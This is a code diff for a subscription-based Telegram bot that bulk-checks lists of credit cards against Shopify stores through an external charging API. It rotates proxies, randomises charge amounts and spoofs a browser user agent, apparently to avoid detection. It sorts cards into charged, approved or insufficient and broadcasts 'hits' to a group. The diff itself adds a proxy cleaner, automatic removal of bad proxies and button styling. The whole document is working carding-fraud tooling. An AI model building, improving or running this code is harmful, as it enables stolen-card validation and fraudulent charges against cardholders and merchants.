@@ -1,5 +1,5 @@
 # ==============================================================================
-# 𝐒𝐇𝐎𝐏𝐈𝐅𝐘 𝐕𝐈𝐏 𝐁𝐎𝐓 - 𝐔𝐋𝐓𝐈𝐌𝐀𝐓𝐄 𝐏𝐑𝐎𝐃𝐔𝐂𝐓𝐈𝐎𝐍 𝐒𝐘𝐒𝐓𝐄𝐌 (UPGRADED)
+# 𝐒𝐇𝐎𝐏𝐈𝐅𝐘 𝐕𝐈𝐏 𝐁𝐎𝐓 - 𝐔𝐋𝐓𝐈𝐌𝐀𝐓𝐄 𝐏𝐑𝐎𝐃𝐔𝐂𝐓𝐈𝐎𝐍 𝐒𝐘𝐒𝐓𝐄module (PROXIES CLEANER INTEGRATED)
 # ==============================================================================
 import asyncio
 import aiohttp
@@ -32,7 +32,6 @@ logger = logging.getLogger("VIP_BOT")
 
 # ====================== CONFIG & GLOBALS ======================
 BOT_TOKEN = os.getenv('BOT_TOKEN', '').strip()
-# تم إضافة المعرف المطلوب لقائمة المسؤولين الافتراضية هنا
 ADMIN_ID = [int(x.strip()) for x in os.getenv("ADMIN_ID", "8879293808,8170592405").split(",") if x.strip()]
 
 JOIN_CHANNEL_ID = os.getenv("JOIN_CHANNEL_ID", "0").strip()
@@ -191,7 +190,7 @@ async def fetch_gif_bytes(url):
 
 async def send_forced_gif(target_func, text, markup, url):
     media_to_send = _GIF_FILE_IDS.get(url, url)
-    for retry in range(4): # تفادي حظر وتأخير الإرسال عند خروج الـ Hits المكثف
+    for retry in range(4): 
         try:
             msg = await target_func(
                 animation=media_to_send, caption=text, reply_markup=markup,
@@ -283,11 +282,10 @@ async def save_keys(keys_data):
                 await f.write(json.dumps(keys_data, indent=4))
         except Exception: pass
 
-# تعديل وتحديث الصلاحيات والحدود للآدمنز والمستخدمين بدقة عالية كما طلبت
 def get_cc_limit(plan, uid=0):
-    if uid in ADMIN_ID: return 40000  # حد فحص الآدمنز 40k بطاقة
+    if uid in ADMIN_ID: return 40000  
     plan_lower = str(plan).lower() if plan else "bronze"
-    if "x" in plan_lower: return 10000  # حد الاشتراكات الأقصى 10k بطاقة
+    if "x" in plan_lower: return 10000  
     if "root" in plan_lower: return 5000
     if "elite" in plan_lower: return 3000
     if "core" in plan_lower: return 1000
@@ -392,6 +390,7 @@ async def send_welcome_menu(update_or_bot, uid, plan, limit):
 <b>{CE_GEAR} {sf('Proxy Manager')}:</b>
  ├ {CE_CANDLE} /addpxy - {sf('Add Proxies')}
  ├ {CE_CANDLE} /proxy - {sf('View Proxies')}
+ ├ {CE_CANDLE} /checkpxy - {sf('Clean Proxies')}
  ╰ {CE_CANDLE} /rmpxy - {sf('Remove Proxies')}
 
 <b>{CE_DIAMOND} {sf('Account Settings')}:</b>
@@ -402,14 +401,14 @@ async def send_welcome_menu(update_or_bot, uid, plan, limit):
 
 <b>{CE_SMILE} {sf('Your Plan')}:</b> <code>{sf(plan.title()) if plan else sf('Free')} ({sf(str(limit))} {sf('CC Limit')})</code>"""
     
-    kb = [[InlineKeyboardButton(sf("View Plans"), callback_data="show_plans")]]
+    kb = [[InlineKeyboardButton(sf("View Plans"), callback_data="show_plans", style="primary")]]
     
     if is_valid_url(JOIN_CHANNEL_LINK) and is_valid_url(JOIN_GROUP_LINK):
-        kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK), InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK)])
+        kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK, style="primary"), InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK, style="primary")])
     elif is_valid_url(JOIN_CHANNEL_LINK):
-        kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK)])
+        kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK, style="primary")])
     elif is_valid_url(JOIN_GROUP_LINK):
-        kb.append([InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK)])
+        kb.append([InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK, style="primary")])
         
     if isinstance(update_or_bot, Update):
         await styled_reply(update_or_bot, t, buttons=kb, use_gif=True, specific_gif=WELCOME_GIF)
@@ -428,15 +427,14 @@ async def force_join_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return True
         
     kb = []
-    if is_valid_url(JOIN_CHANNEL_LINK): kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK)])
-    if is_valid_url(JOIN_GROUP_LINK): kb.append([InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK)])
-    if kb: kb.append([InlineKeyboardButton(sf("Verify"), callback_data="check_joined")])
+    if is_valid_url(JOIN_CHANNEL_LINK): kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK, style="primary")])
+    if is_valid_url(JOIN_GROUP_LINK): kb.append([InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK, style="primary")])
+    if kb: kb.append([InlineKeyboardButton(sf("Verify"), callback_data="check_joined", style="success")])
     
     await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>\n\n├ {sf('You must join our official channels first.')}\n╰ {sf('Please join, then click Verify.')}", buttons=kb, use_gif=True)
     return False
 
 # ====================== GATEWAY APIs ======================
-# إصلاح فحص الـ BIN لمنع سقوط الطلبات أثناء الضغط العالي وتمرير الجلسة الجارية
 async def get_bin_info(bin_code, session=None):
     try:
         url = f"https://bins.antipublic.cc/bins/{bin_code[:6]}"
@@ -450,29 +448,33 @@ async def get_bin_info(bin_code, session=None):
     except Exception: pass
     return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "", "flag": "🏳️"}
 
-# SHOPIFY API
+# SHOPIFY API 
 async def check_shopify_api(card, site, proxy, session):
     try:
         proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
         proxy_param = f"&proxy={proxy_str}" if proxy else ""
         
-        # تغيير مستمر وتلقائي للأسعار والـ Parameters لمنع كشف العمليات وتجاوز Server Error
         dynamic_price = random.choice([5, 10, 14, 15, 20, 25, 30])
-        req_url = f"{SHOPIFY_API_URL}?cc={card}&site={site}{proxy_param}&amount={dynamic_price}&price={dynamic_price}"
+        site_param = site if site.startswith("http") else f"https://{site}"
+        req_url = f"{SHOPIFY_API_URL}?cc={card}&site={site_param}{proxy_param}&amount={dynamic_price}&price={dynamic_price}"
         
-        async with session.get(req_url, timeout=90) as resp:
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+        }
+        
+        async with session.get(req_url, headers=headers, timeout=90) as resp:
             text_data = await resp.text()
             if resp.status != 200: return {'status': 'Site Error', 'message': f'Server Error {resp.status}', 'card': card, 'retry': True}
             try: rj = json.loads(text_data)
             except Exception: return {'status': 'Site Error', 'message': 'Format Error', 'card': card, 'retry': True}
             
-        rm = str(rj.get('Response', '')).strip()
-        pr = rj.get('Price', f"${dynamic_price}.00") # تحديث السعر المرجوع ديناميكياً
+        rm = str(rj.get('Response', rj.get('message', ''))).strip()
+        pr = rj.get('Price', f"${dynamic_price}.00") 
         gt = rj.get('Gateway', 'Shopify')
         st = str(rj.get('Status', '')).strip().lower()
         rl = rm.lower()
         
-        if is_dead_site_error(rm) or any(k in rl for k in ['proxy', 'timeout', 'error', 'session']):
+        if is_dead_site_error(rm) or any(k in rl for k in ['proxy', 'timeout', 'error', 'session', 'bad gateway']):
             return {'status': 'Site Error', 'message': rm, 'card': card, 'retry': True, 'gateway': gt, 'price': pr}
 
         if 'insufficient' in rl or 'funds' in rl or 'balance' in rl:
@@ -480,21 +482,37 @@ async def check_shopify_api(card, site, proxy, session):
 
         if '3d' in rl or 'secure' in rl or 'otp' in rl:
             return {'status': 'Approved', 'message': '3d_secure_required', 'card': card, 'gateway': gt, 'price': pr}
-        if 'approved' in rl or any(k in rl for k in ['invalid_cvv', 'match']): 
+        if 'approved' in rl or any(k in rl for k in ['invalid_cvv', 'match', 'success']): 
             return {'status': 'Approved', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
 
         if st == 'true' or 'success' in rl or 'charged' in rl or 'completed' in rl: 
             return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': gt, 'price': pr}
             
         return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
-    except asyncio.TimeoutError: return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True}
     except Exception as e: return {'status': 'Site Error', 'message': f'Error: {str(e)[:20]}', 'card': card, 'retry': True}
 
+# دالة مساعدة لحذف البروكسي السيء فوراً من قاعدة البيانات عند اكتشافه في بوابة الفحص
+async def remove_proxy_by_url(uid, proxy_url):
+    try:
+        current_proxies = await get_all_user_proxies(uid)
+        if current_proxies:
+            for idx, p in enumerate(current_proxies):
+                if p.get('proxy_url') == proxy_url:
+                    await remove_proxy_by_index(uid, idx)
+                    break
+    except Exception:
+        pass
+
 # Core Checker Function
-async def check_card_with_retry(card, sites, proxies, session, gateway_name, max_retries=2):
-    lr = None; ap = list(proxies) if proxies else []
+async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid, max_retries=2):
+    lr = None
     for _ in range(max_retries):
-        p = random.choice(ap) if ap else None
+        if not proxies:
+            p_dict = None
+            p = None
+        else:
+            p_dict = random.choice(proxies)
+            p = p_dict['proxy_url']
         
         acs = [s for s in sites if _SITE_ERRORS_COUNT.get(s, 0) < _MAX_SITE_ERRORS]
         if not acs: 
@@ -509,6 +527,14 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, max
         if r.get('status') == 'Site Error':
             _SITE_ERRORS_COUNT[s] = _SITE_ERRORS_COUNT.get(s, 0) + 1
             
+            # فحص تلقائي وفوري للبروكسي السيء على البوابة وحذفه مباشرة دون تخريب الجلسة
+            msg_lower = str(r.get('message', '')).lower()
+            if p_dict and any(k in msg_lower for k in ['proxy', 'tunnel', 'connection close', 'timeout', 'refused', '407', '502', '504', 'bad gateway', 'site error', 'format error']):
+                if p_dict in proxies:
+                    try: proxies.remove(p_dict)
+                    except ValueError: pass
+                asyncio.create_task(remove_proxy_by_url(uid, p))
+            
         if not r.get('retry'):
             if r.get('status') in ['Charged', 'Approved', 'Insufficient', 'Dead']: 
                 _SITE_ERRORS_COUNT[s] = 0
@@ -522,7 +548,6 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, max
 def format_card_result(card, gateway, price="-", bin_info=None, elapsed=0.0):
     bi = bin_info or {}
     ps = sf(f"{str(price)}") if price and price != "-" else sf("-")
-    
     h = f"<b>{CE_CROWN} {sf('PAYMENT SUCCEEDED')} {CE_PARTY}</b>"
     
     country_code = str(bi.get('country_code', '')).strip()
@@ -546,23 +571,21 @@ def format_card_result(card, gateway, price="-", bin_info=None, elapsed=0.0):
 
 <b>{CE_CHART} {sf('Took')}:</b> <code>{sf(f'{elapsed:.2f}s')}</code>"""
 
-async def _send_global_hit(gateway, price, uid, bot, elapsed):
+async def _send_global_hit(gateway, price, uid, bot, elapsed, response_msg="Card Charged"):
     if not HITS_GROUP_TARGET: return
     try:
         user_name = _USER_NAMES.get(uid, f"User {uid}")
-        safe_name = escape_html(sf(user_name))
+        safe_name = escape_html(user_name)
         plan = await get_user_plan(uid)
         plan_name = plan.title() if plan else "Free"
-        ps = f" {sf(f'{str(price)}')}" if price and str(price) != "-" else ""
         
-        h = f"<b>{CE_CROWN} {sf('PAYMENT SUCCEEDED')} {CE_PARTY}</b>"
+        gateway_clean = escape_html(str(gateway))
+        price_clean = str(price).replace('$', '').strip()
         
-        text = f"""{h}
-
-<b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gateway)}</code>{ps}
-<b>{CE_BOOM} {sf('Response')}:</b> <code>{sf('Payment Succeeded')}</code>
-<b>{CE_CHART} {sf('Took')}:</b> <code>{sf(f'{elapsed:.2f}s')}</code>
-<b>{CE_SMILE} {sf('User')}:</b> <a href="tg://user?id={uid}">{safe_name}</a> (<code>{sf(plan_name)}</code>)"""
+        text = f"""{CE_CROWN} <b>{sf('HIT')}</b> ⏩ <b>{sf('Charged')}</b> {CE_DIAMOND}
+ │ <b>{sf('Response')}</b> ⏩ <code>{sf('Thank You !')} {sf(price_clean)} {sf('USD')}</code>
+ │ <b>{sf('Gateway')}</b> ⏩ <code>{sf(gateway_clean)}</code>
+ │ <b>{sf('User')}</b> ⏩ <a href="tg://user?id={uid}">{sf(safe_name)}</a> | ⚡ <code>{sf(plan_name)}</code>"""
 
         try: cid = int(HITS_GROUP_TARGET)
         except ValueError: cid = HITS_GROUP_TARGET
@@ -575,13 +598,12 @@ async def _send_global_hit(gateway, price, uid, bot, elapsed):
             except Exception: break
     except Exception: pass
 
-# تم ربط الـ session الممرر لضمان معالجة فورية للـ BIN بدون توقف الأداة
 async def _send_mass_hit(card, gateway, price, uid, elapsed, bot, session):
     await asyncio.sleep(HIT_DELAY)
     try:
         bi = await get_bin_info(card.split("|")[0], session)
         msg = format_card_result(card, gateway, price, bi, elapsed)
-        kb = [[InlineKeyboardButton(sf("Contact Owner"), url="https://t.me/Dddadddyttt")]]
+        kb = [[InlineKeyboardButton(sf("Contact Owner"), url="https://t.me/Dddadddyttt", style="primary")]]
         await styled_send(bot, uid, msg, buttons=kb, use_gif=True)
     except Exception: pass
 
@@ -624,8 +646,8 @@ async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE
         PENDING_FILES[uid] = cards
         
         kb = [
-            [InlineKeyboardButton(sf("Shopify (Charge)"), callback_data="gate:Shopify")],
-            [InlineKeyboardButton(sf("Cancel"), callback_data="gate:cancel")]
+            [InlineKeyboardButton(sf("Shopify (Charge)"), callback_data="gate:Shopify", style="success")],
+            [InlineKeyboardButton(sf("Cancel"), callback_data="gate:cancel", style="danger")]
         ]
         await styled_edit(pm, f"<b>{CE_CROWN} {sf('File Loaded Successfully')}</b>\n\n├ <b>{CE_DIAMOND} {sf('Total CCs')}:</b> <code>{sf(str(len(cards)))}</code>\n╰ <b>{CE_TOP} {sf('Please select a Gateway to start')}:</b>", buttons=kb)
     except Exception as e: await styled_edit(pm, f"<b>{CE_CLOWN} {sf('Error')}:</b> {sf(str(e))}")
@@ -681,7 +703,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         for _, pi in PLANS.items():
             t += f"├ <b>{sf(pi['name'])}</b>\n│ ├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(pi['duration_days']))} {sf('Days')}</code>\n│ ├ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(get_cc_limit(pi['tier'])))} {sf('CCs')}</code>\n│ ╰ <b>{CE_CASH} {sf('Price')}:</b> <code>{sf(pi['price'])}</code>\n│\n"
         t += f"╰ <b>{sf('Your Current Plan')}:</b> <code>{sf(cp.title()) if cp else sf('Bronze')}</code>"
-        kb = [[InlineKeyboardButton(sf("Contact Owner"), url="https://t.me/Dddadddyttt")], [InlineKeyboardButton(sf("Back"), callback_data="back_start")]]
+        kb = [[InlineKeyboardButton(sf("Contact Owner"), url="https://t.me/Dddadddyttt", style="primary")], [InlineKeyboardButton(sf("Back"), callback_data="back_start", style="danger")]]
         await styled_reply(update, t, buttons=kb, use_gif=True)
 
     elif cmd == "fb":
@@ -742,6 +764,39 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if len(proxies) > 30: t += f"\n<i>+{sf(str(len(proxies)-30))} {sf('more...')}</i>"
         await styled_reply(update, t, use_gif=True)
 
+    elif cmd == "checkpxy":
+        if not await force_join_check(update, context): return
+        proxies = await get_all_user_proxies(uid)
+        if not proxies: 
+            return await styled_reply(update, f"<b>{CE_CLOWN} {sf('No proxies found to check.')}</b>", use_gif=True)
+            
+        tm = await styled_reply(update, f"<b>{CE_GEAR} {sf('Starting proxy check... Please wait.')}</b>", use_gif=True)
+        
+        test_url = "http://httpbin.org/ip"
+        dead_indices = []
+        
+        async with aiohttp.ClientSession() as session:
+            for idx, p in enumerate(proxies):
+                proxy_url = p['proxy_url']
+                try:
+                    timeout = aiohttp.ClientTimeout(total=4)
+                    async with session.get(test_url, proxy=proxy_url, timeout=timeout) as resp:
+                        if resp.status == 200:
+                            continue
+                except Exception:
+                    pass
+                dead_indices.append(idx)
+                
+        deleted_count = 0
+        for idx in sorted(dead_indices, reverse=True):
+            await remove_proxy_by_index(uid, idx)
+            deleted_count += 1
+            
+        if deleted_count > 0:
+            await styled_edit(tm, f"<b>{CE_SMILE} {sf('Check Done')}</b>\n\n├ {sf('Removed')}: <code>{deleted_count}</code> {sf('Dead Proxies')}\n╰ {sf('Remaining')}: <code>{len(proxies) - deleted_count}</code> {sf('Active Proxies')}")
+        else:
+            await styled_edit(tm, f"<b>{CE_SMILE} {sf('All proxies are working perfectly!')}</b>")
+
     elif cmd == "rmpxy":
         if not await force_join_check(update, context): return
         proxies = await get_all_user_proxies(uid)
@@ -795,7 +850,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         limit = get_cc_limit(t, uid)
         
         user_name = _USER_NAMES.get(uid, f"User {uid}")
-        safe_name = escape_html(sf(user_name))
+        safe_name = escape_html(user_name)
         
         msg = f"""<b>{CE_PARTY} {sf('Subscription Activated Successfully!')}</b>
 
@@ -825,7 +880,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         se, st = ('🔴', "Used") if u else ('🟢', "Active")
         m = f"<b>{CE_DIAMOND} {sf('Key Information')}</b>\n\n├ <b>{sf('Key')}:</b> <code>{sf(c)}</code>\n├ <b>{CE_SMILE} {sf('Status')}:</b> <code>{sf(st)}</code>\n├ <b>{sf('Plan Tier')}:</b> <code>{sf(ki.get('tier', 'Unknown'))}</code>\n├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(ki.get('days', 0)))} {sf('Days')}</code>\n╰ <b>{CE_CHART} {sf('Generated')}:</b> <code>{sf(ki.get('generated_at', 'Unknown'))}</code>"
         if u: 
-            prof_name = escape_html(sf(_USER_NAMES.get(ub, f"User {ub}")))
+            prof_name = escape_html(_USER_NAMES.get(ub, f"User {ub}"))
             m += f"\n\n├ <b>{CE_SMILE} {sf('Redeemed By')}:</b> <code>{sf(str(ub))}</code> <a href='tg://user?id={ub}'>[{prof_name}]</a>\n╰ <b>{CE_CHART} {sf('Redeem Time')}:</b> <code>{sf(ki.get('redeemed_at', 'Not yet'))}</code>"
         await styled_reply(update, m, use_gif=True)
 
@@ -842,7 +897,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         active_info = []
         for u, p in list(ACTIVE_MTXT_PROCESSES.items()):
             if not p.get("stopped"):
-                un = escape_html(sf(_USER_NAMES.get(u, f"User {u}")))
+                un = escape_html(_USER_NAMES.get(u, f"User {u}"))
                 gate = p.get("gate", "Unknown")
                 total = p.get("total", "?")
                 active_info.append(f"  ├ <b>{CE_SMILE} {sf('User')}:</b> <a href='tg://user?id={u}'>{un}</a> (<code>{sf(str(u))}</code>)\n  │  ╰ Gate: <code>{sf(gate)}</code> | CCs: <code>{sf(str(total))}</code>")
@@ -850,7 +905,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         recent_users_info = []
         sorted_users = sorted(USER_LAST_REQ.items(), key=lambda x: x[1], reverse=True)[:15] 
         for u, _ in sorted_users:
-            un = escape_html(sf(_USER_NAMES.get(u, f"User {u}")))
+            un = escape_html(_USER_NAMES.get(u, f"User {u}"))
             recent_users_info.append(f"  │  ├ <b>{CE_SMILE} {sf('User')}:</b> <a href='tg://user?id={u}'>{un}</a>\n  │  ╰ ID: <code>{sf(str(u))}</code>")
             
         text = f"<b>{CE_GEAR} {sf('Global System Status')}</b>\n\n├ <b>{sf('Total Session Users')}:</b> <code>{sf(str(len(USER_LAST_REQ)))}</code>\n"
@@ -890,7 +945,7 @@ async def plans_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     for _, pi in PLANS.items():
         t += f"├ <b>{sf(pi['name'])}</b>\n│ ├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(pi['duration_days']))} {sf('Days')}</code>\n│ ├ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(get_cc_limit(pi['tier'])))} {sf('CCs')}</code>\n│ ╰ <b>{CE_CASH} {sf('Price')}:</b> <code>{sf(pi['price'])}</code>\n│\n"
     t += f"╰ <b>{sf('Your Current Plan')}:</b> <code>{sf(cp.title()) if cp else sf('Bronze')}</code>"
-    kb = [[InlineKeyboardButton(sf("Contact Owner"), url="https://t.me/Dddadddyttt")], [InlineKeyboardButton(sf("Back"), callback_data="back_start")]]
+    kb = [[InlineKeyboardButton(sf("Contact Owner"), url="https://t.me/Dddadddyttt", style="primary")], [InlineKeyboardButton(sf("Back"), callback_data="back_start", style="danger")]]
     await styled_edit(q.message, t, buttons=kb)
     await q.answer()
 
@@ -912,24 +967,25 @@ async def back_start_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
 <b>{CE_GEAR} {sf('Proxy Manager')}:</b>
  ├ {CE_CANDLE} /addpxy - {sf('Add Proxies')}
  ├ {CE_CANDLE} /proxy - {sf('View Proxies')}
+ ├ {CE_CANDLE} /checkpxy - {sf('Clean Proxies')}
  ╰ {CE_CANDLE} /rmpxy - {sf('Remove Proxies')}
 
 <b>{CE_DIAMOND} {sf('Account Settings')}:</b>
  ├ {CE_CANDLE} /info - {sf('Profile Info')}
  ├ {CE_CANDLE} /redeem - {sf('Redeem Key')}
  ├ {CE_CANDLE} /fb - {sf('Send Feedback')}
- ╰ {CE_CANDLE} /plan - {sf('View Subscriptions')}{admin_panel}
+ ╰ {CE_CANDLE} /plan - View Subscriptions{admin_panel}
 
 <b>{CE_SMILE} {sf('Your Plan')}:</b> <code>{sf(plan.title()) if plan else sf('Free')} ({sf(str(limit))} {sf('CC Limit')})</code>"""
     
-    kb = [[InlineKeyboardButton(sf("View Plans"), callback_data="show_plans")]]
+    kb = [[InlineKeyboardButton(sf("View Plans"), callback_data="show_plans", style="primary")]]
     
     if is_valid_url(JOIN_CHANNEL_LINK) and is_valid_url(JOIN_GROUP_LINK):
-        kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK), InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK)])
+        kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK, style="primary"), InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK, style="primary")])
     elif is_valid_url(JOIN_CHANNEL_LINK):
-        kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK)])
+        kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK, style="primary")])
     elif is_valid_url(JOIN_GROUP_LINK):
-        kb.append([InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK)])
+        kb.append([InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK, style="primary")])
         
     await styled_edit(q.message, t, buttons=kb)
     await q.answer()
@@ -981,7 +1037,10 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
     st = time.time()
     
     sites = await get_shopify_sites()
-    proxies = [p['proxy_url'] for p in await get_all_user_proxies(uid)] if await get_all_user_proxies(uid) else []
+    proxies = await get_all_user_proxies(uid)
+    if not proxies: proxies = []
+    else: proxies = list(proxies) 
+    
     http_session = await get_user_http_session(uid)
     
     last_resp = sf("Waiting for response...")
@@ -1004,12 +1063,12 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
             percent = int((chk / tot) * 100) if tot > 0 else 0
             
             kb = [
-                [InlineKeyboardButton(sf(f"📄 {chk}/{tot} ({percent}%)"), callback_data="none" if percent == 100 else "none")],
-                [InlineKeyboardButton(sf(f"⇌ Charged: {chg}"), callback_data="none"), InlineKeyboardButton(sf(f"✅ Approved: {app}"), callback_data="none")],
-                [InlineKeyboardButton(sf(f"● Insuff: {ins}"), callback_data="none"), InlineKeyboardButton(sf(f"✖ Declined: {dec}"), callback_data="none")],
-                [InlineKeyboardButton(sf(f"❗ Errors: {err}"), callback_data="none")],
-                [InlineKeyboardButton(sf(f"🚀 Speed: {cpm} CPM"), callback_data="none")],
-                [InlineKeyboardButton(sf("🛑 Stop Process"), callback_data=f"{stop_prefix}:{uid}")]
+                [InlineKeyboardButton(sf(f"📄 {chk}/{tot} ({percent}%)"), callback_data="none", style="success" if percent == 100 else "primary")],
+                [InlineKeyboardButton(sf(f"⇌ Charged: {chg}"), callback_data="none", style="success"), InlineKeyboardButton(sf(f"✅ Approved: {app}"), callback_data="none", style="success")],
+                [InlineKeyboardButton(sf(f"● Insuff: {ins}"), callback_data="none", style="success"), InlineKeyboardButton(sf(f"✖ Declined: {dec}"), callback_data="none", style="danger")],
+                [InlineKeyboardButton(sf(f"❗ Errors: {err}"), callback_data="none", style="danger")],
+                [InlineKeyboardButton(sf(f"🚀 Speed: {cpm} CPM"), callback_data="none", style="primary")],
+                [InlineKeyboardButton(sf("🛑 Stop Process"), callback_data=f"{stop_prefix}:{uid}", style="danger")]
             ]
             try: await styled_edit(msg_obj, dt, buttons=kb)
             except asyncio.CancelledError: break
@@ -1031,7 +1090,7 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
             async with sem:
                 try:
                     c_st = time.time()
-                    res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, max_retries=2)
+                    res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, uid, max_retries=2)
                     if is_stopped(): break 
                     
                     c_el = time.time() - c_st
@@ -1044,9 +1103,8 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                     
                     if status == 'Charged':
                         chg += 1
-                        # تم تمرير الـ http_session هنا لضمان إرسال مباشر وسريع لبيانات الـ BIN والبطاقة بدون تعليق
                         asyncio.create_task(_send_mass_hit(card, gate_name, res.get('price', '-'), uid, c_el, bot, http_session))
-                        asyncio.create_task(_send_global_hit(gateway=gate_name, price=res.get('price', '-'), uid=uid, bot=bot, elapsed=c_el))
+                        asyncio.create_task(_send_global_hit(gateway=gate_name, price=res.get('price', '-'), uid=uid, bot=bot, elapsed=c_el, response_msg=res.get('message', 'Card Charged')))
                     elif status == 'Approved': app += 1
                     elif status == 'Insufficient': ins += 1
                     elif status == 'Site Error': err += 1
@@ -1070,11 +1128,11 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
     ft = f"<b>{CE_CROWN} {sf('DONE')} {CE_PARTY}</b>\n\n├ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gate_name)}</code>\n├ <b>{CE_GEAR} {sf('Workers')}:</b> <code>{sf(str(WORKERS))}</code>\n├ <b>{CE_BOOM} {sf('Response')}:</b> <code>{sf(last_resp)}</code>\n╰ <b>{CE_CHART} {sf('Total Time')}:</b> <code>{sf(f'{h}h {m}m {s}s')}</code>"
     
     fkb = [
-        [InlineKeyboardButton(sf(f"📄 {chk}/{tot} (100%)"), callback_data="none")],
-        [InlineKeyboardButton(sf(f"⇌ Charged: {chg}"), callback_data="none"), InlineKeyboardButton(sf(f"✅ Approved: {app}"), callback_data="none")],
-        [InlineKeyboardButton(sf(f"● Insuff: {ins}"), callback_data="none"), InlineKeyboardButton(sf(f"✖ Declined: {dec}"), callback_data="none")],
-        [InlineKeyboardButton(sf(f"❗ Errors: {err}"), callback_data="none")],
-        [InlineKeyboardButton(sf(f"🚀 Average Speed: {avg_cpm} CPM"), callback_data="none")]
+        [InlineKeyboardButton(sf(f"📄 {chk}/{tot} (100%)"), callback_data="none", style="success")],
+        [InlineKeyboardButton(sf(f"⇌ Charged: {chg}"), callback_data="none", style="success"), InlineKeyboardButton(sf(f"✅ Approved: {app}"), callback_data="none", style="success")],
+        [InlineKeyboardButton(sf(f"● Insuff: {ins}"), callback_data="none", style="success"), InlineKeyboardButton(sf(f"✖ Declined: {dec}"), callback_data="none", style="danger")],
+        [InlineKeyboardButton(sf(f"❗ Errors: {err}"), callback_data="none", style="danger")],
+        [InlineKeyboardButton(sf(f"🚀 Average Speed: {avg_cpm} CPM"), callback_data="none", style="primary")]
     ]
     try: await styled_edit(msg_obj, ft, buttons=fkb)
     except Exception: pass
